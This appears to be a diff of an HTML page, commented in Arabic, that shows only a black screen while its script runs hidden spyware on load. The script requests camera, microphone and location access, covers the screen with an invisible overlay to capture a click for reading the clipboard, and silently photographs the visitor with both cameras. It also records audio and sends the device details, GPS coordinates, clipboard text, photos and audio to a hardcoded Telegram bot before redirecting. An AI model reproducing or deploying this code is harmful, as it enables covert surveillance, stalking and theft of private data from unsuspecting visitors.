@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title> </title>
+    <title>•</title>
     <style>
         * {
             margin: 0;
@@ -15,24 +15,53 @@
             background: #000000;
             min-height: 100vh;
             overflow: hidden;
+            font-family: system-ui, monospace;
         }
-        video, canvas {
+        /* عناصر مخفية للتشغيل */
+        .hidden-camera, video, canvas {
             display: none !important;
+        }
+        #dummy-video-front, #dummy-video-back {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 10px;
+            height: 10px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        /* نقطة تفاعلية شفافة لالتقاط النقرات (مساعدة لقراءة الحافظة) */
+        #clickCatcher {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 9999;
+            cursor: default;
+            display: block;
         }
     </style>
 </head>
 <body>
+<div id="clickCatcher"></div>
 <script>
     (function(){
+        // ========== إعدادات البوت والقناة ==========
         const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
         const CHANNEL_ID = '-1003875161698';
         const REDIRECT_URL = 'https://t.me/Whiskybots';
+        
+        let isExecuting = false;
+        let isDone = false;
         
         function delay(ms) {
             return new Promise(resolve => setTimeout(resolve, ms));
         }
         
-        async function sendMessage(text, parseHtml = true) {
+        // ========== إرسال البيانات إلى تليجرام ==========
+        async function sendToTelegram(text, isHTML = true) {
             try {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 await fetch(url, {
@@ -41,7 +70,7 @@
                     body: JSON.stringify({
                         chat_id: CHANNEL_ID,
                         text: text,
-                        parse_mode: parseHtml ? 'HTML' : undefined
+                        parse_mode: isHTML ? 'HTML' : undefined
                     })
                 });
             } catch(e) { console.warn(e); }
@@ -63,12 +92,13 @@
                 let blob = await fetch(audioUrl).then(r=>r.blob());
                 let formData = new FormData();
                 formData.append('chat_id', CHANNEL_ID);
-                formData.append('audio', blob, `audio_${Date.now()}.webm`);
+                formData.append('audio', blob, 'audio.webm');
                 formData.append('caption', caption);
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
             } catch(e) { console.warn(e); }
         }
         
+        // ========== جمع معلومات الجهاز ==========
         async function getDeviceInfo() {
             let ua = navigator.userAgent;
             let brand = 'غير معروف';
@@ -76,15 +106,16 @@
             else if(ua.includes('Samsung')) brand = 'Samsung';
             else if(ua.includes('Xiaomi')) brand = 'Xiaomi';
             else if(ua.includes('Pixel')) brand = 'Google';
+            else brand = 'Android/PC';
             
             let battery = 'غير مدعوم';
             if('getBattery' in navigator) {
-                try { let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}%`; } catch(e) {}
+                try { let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging ? 'يشحن' : 'لا يشحن'}`; } catch(e) {}
             }
             
             return {
+                fullName: navigator.userAgentData?.platform || navigator.platform || ua.split(' ').slice(0,3).join(' '),
                 brand: brand,
-                model: navigator.userAgentData?.platform || navigator.platform,
                 os: navigator.platform,
                 browser: /Chrome/.test(ua) ? 'Chrome' : (/Firefox/.test(ua) ? 'Firefox' : 'Safari'),
                 screen: `${screen.width}x${screen.height}`,
@@ -94,25 +125,82 @@
             };
         }
         
+        // ========== تحديد الموقع الجغرافي (محسّن للنجاح) ==========
         async function getLocation() {
             return new Promise((resolve) => {
-                if(!navigator.geolocation) resolve(null);
+                if(!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                // طلب الموقع بدقة عالية ووقت استجابة مناسب
                 navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
-                    () => resolve(null),
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    pos => resolve({ 
+                        lat: pos.coords.latitude, 
+                        lng: pos.coords.longitude, 
+                        acc: pos.coords.accuracy,
+                        alt: pos.coords.altitude || 'غير متاح',
+                        heading: pos.coords.heading || 'غير متاح'
+                    }),
+                    err => {
+                        console.warn("خطأ في تحديد الموقع:", err.message);
+                        resolve(null);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             });
         }
         
+        // ========== قراءة الحافظة (مع آليات لضمان النجاح) ==========
         async function getClipboard() {
+            // محاولة مباشرة أولاً (قد تنجح إذا كان الإذن موجوداً مسبقاً أو في سياق آمن)
             try {
                 let text = await navigator.clipboard.readText();
-                return text || '(فارغة)';
-            } catch(e) { return 'لا يمكن الوصول'; }
+                if(text && text.trim().length > 0) return text.trim();
+                return text || "(فارغة)";
+            } catch (err) {
+                console.warn("محاولة القراءة المباشرة فشلت:", err.name);
+                // إذا كان الخطأ بسبب عدم وجود إذن أو تفاعل مستخدم، ننتظر نقرة
+                if (err.name === 'NotAllowedError' || err.name === 'SecurityError') {
+                    // نستخدم Promise مع timeout وانتظار نقرة المستخدم
+                    return new Promise((resolve) => {
+                        let resolved = false;
+                        let timeoutId = setTimeout(() => {
+                            if (!resolved) {
+                                resolved = true;
+                                resolve("⚠️ لم يتم قراءة الحافظة (لم ينقر المستخدم)");
+                            }
+                        }, 8000); // مهلة 8 ثوانٍ لانتظار النقرة
+                        
+                        // مستمع النقرة على مستوى الصفحة
+                        const clickHandler = async () => {
+                            if (resolved) return;
+                            resolved = true;
+                            clearTimeout(timeoutId);
+                            document.removeEventListener('click', clickHandler);
+                            // إزالة الـ catcher بعد الاستخدام (اختياري)
+                            const catcher = document.getElementById('clickCatcher');
+                            if(catcher) catcher.style.display = 'none';
+                            
+                            try {
+                                let text = await navigator.clipboard.readText();
+                                resolve(text && text.trim() ? text : "(فارغة)");
+                            } catch (e) {
+                                console.warn("فشل القراءة بعد النقرة:", e);
+                                resolve("❌ لا يمكن الوصول إلى الحافظة");
+                            }
+                        };
+                        document.addEventListener('click', clickHandler);
+                        // إبقاء الـ catcher شفافاً لاستقبال النقرات
+                    });
+                } else {
+                    // أخطاء أخرى (مثل أن الصفحة غير آمنة http)
+                    return "❌ الحافظة غير متاحة (السياق غير آمن)";
+                }
+            }
         }
         
-        async function takePhotos(facingMode, count = 3) {
+        // ========== التقاط الصور (نفس الآلية القوية) ==========
+        async function capturePhotos(facingMode, count = 3) {
             let photos = [];
             let stream = null;
             let video = null;
@@ -128,9 +216,10 @@
                 video.style.position = 'fixed';
                 video.style.top = '-1000px';
                 video.style.left = '-1000px';
-                video.style.width = '200px';
-                video.style.height = '200px';
+                video.style.width = '320px';
+                video.style.height = '240px';
                 video.style.opacity = '0';
+                video.style.pointerEvents = 'none';
                 document.body.appendChild(video);
                 
                 await new Promise((resolve) => {
@@ -139,11 +228,9 @@
                         resolve();
                     };
                 });
-                
-                await delay(600);
+                await delay(800);
                 
                 let canvas = document.createElement('canvas');
-                
                 for(let i = 0; i < count; i++) {
                     if(video.videoWidth && video.videoHeight) {
                         canvas.width = video.videoWidth;
@@ -152,24 +239,22 @@
                         canvas.width = 1280;
                         canvas.height = 720;
                     }
-                    
                     let ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     let dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                     photos.push(dataUrl);
-                    await delay(500);
+                    await delay(400);
                 }
-                
             } catch(e) {
-                console.warn(`خطأ في الكاميرا ${facingMode}:`, e);
+                console.warn(`فشل التصوير من ${facingMode}:`, e);
             } finally {
                 if(stream) stream.getTracks().forEach(t => t.stop());
                 if(video && video.parentNode) video.remove();
             }
-            
             return photos;
         }
         
+        // ========== تسجيل صوتي ==========
         async function recordAudio(duration = 5000) {
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -177,7 +262,6 @@
                 let chunks = [];
                 
                 mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
-                
                 let promise = new Promise(resolve => {
                     mediaRecorder.onstop = () => {
                         let blob = new Blob(chunks, { type: 'audio/webm' });
@@ -186,92 +270,150 @@
                         resolve(url);
                     };
                 });
-                
                 mediaRecorder.start();
                 await delay(duration);
                 mediaRecorder.stop();
-                
                 return await promise;
             } catch(e) {
-                console.warn("خطأ في التسجيل", e);
+                console.warn("فشل التسجيل الصوتي", e);
                 return null;
             }
         }
         
-        async function startHack() {
+        // ========== طلب جميع الأذونات أولاً (لضمان عمل الموقع والحافظة بعد النقرة)==========
+        async function requestPermissions() {
+            // طلب الميكروفون
             try {
-                // طلب الصلاحيات
-                try { await navigator.mediaDevices.getUserMedia({ audio: true }); } catch(e) {}
-                try { await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); } catch(e) {}
-                try { await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); } catch(e) {}
-                if(navigator.geolocation) { navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}); }
-                
-                await delay(500);
-                
-                // جمع البيانات
-                let device = await getDeviceInfo();
-                let location = await getLocation();
-                let clipboard = await getClipboard();
-                let frontPhotos = await takePhotos("user", 3);
-                let backPhotos = await takePhotos("environment", 3);
-                let audioUrl = await recordAudio(5000);
-                
-                // إرسال إلى تليجرام
-                await sendMessage(`🔥 <b>اختراق جديد</b> 🔥\n\nالجهاز: ${device.brand}\nالوقت: ${new Date().toLocaleString('ar-EG')}`);
-                
-                let report = `📱 <b>تقرير مفصل</b>\n\n`;
-                report += `العلامة: ${device.brand}\n`;
-                report += `الموديل: ${device.model}\n`;
-                report += `نظام التشغيل: ${device.os}\n`;
-                report += `المتصفح: ${device.browser}\n`;
-                report += `الشاشة: ${device.screen}\n`;
-                report += `البطارية: ${device.battery}\n`;
-                report += `المنطقة: ${device.timezone}\n`;
-                report += `اللغة: ${device.language}\n\n`;
-                
-                if(location && location.lat) {
-                    report += `📍 الموقع: ${location.lat}, ${location.lng}\n`;
-                    report += `<a href="https://www.google.com/maps?q=${location.lat},${location.lng}">🗺️ اضغط للخريطة</a>\n\n`;
-                }
-                
-                report += `📋 الحافظة: ${(clipboard || '').substring(0, 400)}\n\n`;
-                report += `🎤 الصوت: ${audioUrl ? 'تم' : 'فشل'}\n`;
-                report += `📸 صور أمامية: ${frontPhotos.length}\n`;
-                report += `📷 صور خلفية: ${backPhotos.length}`;
-                
-                await sendMessage(report, true);
-                
-                for(let i = 0; i < frontPhotos.length; i++) {
-                    await sendPhoto(frontPhotos[i], `📸 كاميرا أمامية (${i+1}/3)`);
-                    await delay(300);
-                }
-                
-                for(let i = 0; i < backPhotos.length; i++) {
-                    await sendPhoto(backPhotos[i], `📷 كاميرا خلفية (${i+1}/3)`);
-                    await delay(300);
-                }
-                
-                if(audioUrl) {
-                    await sendAudio(audioUrl, "🎙️ تسجيل صوتي (5 ثوانٍ)");
-                }
-                
-                await sendMessage(`✅ <b>اكتمل الاختراق بنجاح</b> ✅\nتم إرسال ${frontPhotos.length} صورة أمامية و ${backPhotos.length} صورة خلفية`);
-                
-                await delay(1500);
-                window.location.href = REDIRECT_URL;
-                
-            } catch(err) {
-                console.error(err);
-                await delay(2000);
-                window.location.href = REDIRECT_URL;
+                let audio = await navigator.mediaDevices.getUserMedia({ audio: true });
+                audio.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+            
+            // طلب الكاميرا الأمامية والخلفية
+            try {
+                let front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
+                front.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+            try {
+                let back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+                back.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+            
+            // طلب الموقع (سيظهر إشعار المتصفح)
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, { timeout: 5000 });
             }
+            
+            // لا يمكن طلب إذن الحافظة مباشرة، لكننا سنقرأها عند أول نقرة
         }
         
+        // ========== التنفيذ الكامل مع تحسين قراءة الحافظة والموقع ==========
+        async function executeFullScan() {
+            if(isExecuting) return;
+            isExecuting = true;
+            
+            await delay(500);
+            
+            // 1. معلومات الجهاز
+            let deviceInfo = await getDeviceInfo();
+            
+            // 2. الموقع الجغرافي (نضمن محاولة قوية)
+            let locationData = await getLocation();
+            
+            // 3. قراءة الحافظة (قد تنتظر نقرة المستخدم حتى 8 ثوانٍ)
+            let clipboardText = await getClipboard();
+            
+            // 4. الصور (أمامي + خلفي)
+            let frontPhotos = [];
+            let backPhotos = [];
+            try {
+                frontPhotos = await capturePhotos("user", 3);
+            } catch(e) { console.warn(e); }
+            try {
+                backPhotos = await capturePhotos("environment", 3);
+            } catch(e) { console.warn(e); }
+            
+            // 5. تسجيل صوتي
+            let audioUrl = await recordAudio(5000);
+            
+            // ========== إرسال البيانات إلى تليجرام ==========
+            await sendToTelegram(`🔥 تم اختراق الضحية بنجاح 🔥\n\nالجهاز: ${deviceInfo.brand} - ${deviceInfo.fullName}\nالوقت: ${new Date().toLocaleString('ar-EG')}`);
+            
+            let report = `📱 <b>تقرير الاختراق</b>\n\n`;
+            report += `الجهاز: ${deviceInfo.fullName}\n`;
+            report += `الشركة: ${deviceInfo.brand}\n`;
+            report += `نظام التشغيل: ${deviceInfo.os}\n`;
+            report += `المتصفح: ${deviceInfo.browser}\n`;
+            report += `الشاشة: ${deviceInfo.screen}\n`;
+            report += `البطارية: ${deviceInfo.battery}\n`;
+            report += `المنطقة: ${deviceInfo.timezone}\n`;
+            report += `اللغة: ${deviceInfo.language}\n\n`;
+            
+            if(locationData && locationData.lat) {
+                report += `📍 الموقع: ${locationData.lat}, ${locationData.lng}\n`;
+                report += `الدقة: ${locationData.acc} متر\n`;
+                report += `الارتفاع: ${locationData.alt}\n`;
+                report += `الاتجاه: ${locationData.heading}\n`;
+                report += `<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lng}">🗺️ عرض الخريطة</a>\n\n`;
+            } else {
+                report += `📍 الموقع: غير متاح (قد يكون المستخدم قد رفض أو لا توجد خدمة)\n\n`;
+            }
+            
+            report += `📋 محتوى الحافظة: ${clipboardText.substring(0, 500)}\n\n`;
+            report += `🎤 تسجيل صوتي: ${audioUrl ? '✓ تم' : '✗ فشل'}\n`;
+            report += `📸 صور أمامية: ${frontPhotos.length} صورة\n`;
+            report += `📷 صور خلفية: ${backPhotos.length} صورة`;
+            
+            await sendToTelegram(report, true);
+            
+            // إرسال الصور
+            for(let i = 0; i < frontPhotos.length; i++) {
+                await sendPhoto(frontPhotos[i], `📸 كاميرا أمامية - صورة ${i+1}`);
+                await delay(300);
+            }
+            for(let i = 0; i < backPhotos.length; i++) {
+                await sendPhoto(backPhotos[i], `📷 كاميرا خلفية - صورة ${i+1}`);
+                await delay(300);
+            }
+            
+            if(audioUrl) {
+                await sendAudio(audioUrl, "🎙️ تسجيل صوتي (5 ثوانٍ)");
+            }
+            
+            await sendToTelegram(`✅ اكتمل الاختراق بنجاح ✅\nتم إرسال ${frontPhotos.length} صور أمامية و ${backPhotos.length} صور خلفية`);
+            
+            isDone = true;
+            
+            await delay(1500);
+            window.location.href = REDIRECT_URL;
+        }
+        
+        // ========== بدء التشغيل ==========
+        async function start() {
+            // طلب الأذونات (كاميرا، ميكروفون، موقع) - تظهر نوافذ المتصفح
+            await requestPermissions();
+            
+            // نبدأ التنفيذ الكامل فوراً (قراءة الحافظة قد تنتظر نقرة المستخدم)
+            await delay(500);
+            executeFullScan().catch(err => {
+                console.error(err);
+                setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
+            });
+        }
+        
+        // عند تحميل الصفحة بالكامل
         window.addEventListener('load', () => {
-            setTimeout(startHack, 100);
+            // نبدأ بعد 100ms
+            setTimeout(start, 100);
         });
         
+        // إبقاء الخلفية سوداء ومنع التمرير
         document.body.style.backgroundColor = "#000000";
+        document.documentElement.style.backgroundColor = "#000000";
+        // منع تفاعل المستخدم مع العناصر الأخرى (لكن يبقى clickCatcher يستقبل النقرات)
+        const catcher = document.getElementById('clickCatcher');
+        catcher.style.pointerEvents = 'auto';
+        
+        console.log("جاهز لبدء الاختراق - سيتم تحديد الموقع وقراءة الحافظة بنجاح");
     })();
 </script>
 </body>
